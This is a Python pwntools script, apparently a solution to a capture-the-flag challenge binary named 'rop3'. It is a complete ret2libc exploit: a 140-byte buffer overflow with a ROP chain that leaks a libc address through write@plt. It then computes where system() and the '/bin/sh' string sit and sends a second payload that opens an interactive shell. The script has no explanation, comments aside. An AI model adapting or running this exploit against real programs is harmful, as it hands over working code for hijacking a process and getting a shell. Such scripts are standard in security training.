from pwn import *

context(os='linux', arch='i386')
#context.log_level = 'debug'

p = process('./rop3')
#p=process('./rop3',env={"LD_PRELOAD":"./libc.so"})

elf = ELF('./rop3')


libc_base = 0xf7dc2000
getegid_addr = 0xf7e900a0
system_addr = 0xf7e07830
bin_sh_addr = 0xf7f54352


base_func_off = getegid_addr - libc_base
system_base_off = system_addr - libc_base
shell_offset = bin_sh_addr - libc_base


payload = 'a'*140
payload += p32(0x080483a0)# write@plt address
payload += p32(0x080484c6)# main address for the program to return to after calling write
payload += p32(0x1)# file descriptor
payload += p32(0x804a004)# buffer - address in the got table
payload += p32(0x8)#buffer size

p.sendline(payload)
out = p.recv(4)
func = u32(out)
print("libc_func_address: {}".format(hex(func)))

base = func - base_func_off
system = base + system_base_off
shell = base + shell_offset

payload = ''
payload += 'a'*140
payload += p32(system)
payload += 'b'*4
payload += p32(shell)

p.sendline(payload)
p.recv()
#info(s)


p.interactive()

